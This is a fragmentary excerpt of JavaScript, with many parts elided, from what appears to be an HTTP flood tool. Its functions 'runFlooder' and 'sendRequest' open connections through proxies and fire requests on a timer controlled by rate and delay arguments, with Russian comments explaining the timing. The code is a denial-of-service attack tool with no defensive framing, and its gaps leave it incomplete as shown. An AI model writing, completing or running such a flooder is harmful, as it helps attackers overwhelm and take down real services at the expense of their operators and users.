...
function sendRequest(client) {
    ...
    const exclusive = Math.random() > 0.5;
...
function runFlooder() {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        client.on("connect", () => {
            // Если delay = 0, отправляем все запросы сразу
            if (args.delay === 0) {
                setInterval(() => {
                ...
                // Если delay > 0, отправляем запросы с интервалом
                const interval = 1000 / args.Rate; // интервал между запросами
                let requestCount = 0;
                
                setInterval(() => {
                    sendRequest(client);
                    requestCount++;
                    if (requestCount >= args.Rate) {
                        requestCount = 0;
                    }
                }, interval > args.delay ? interval : args.delay);
            }
        });
        client.on("close", () => {
            client.destroy();
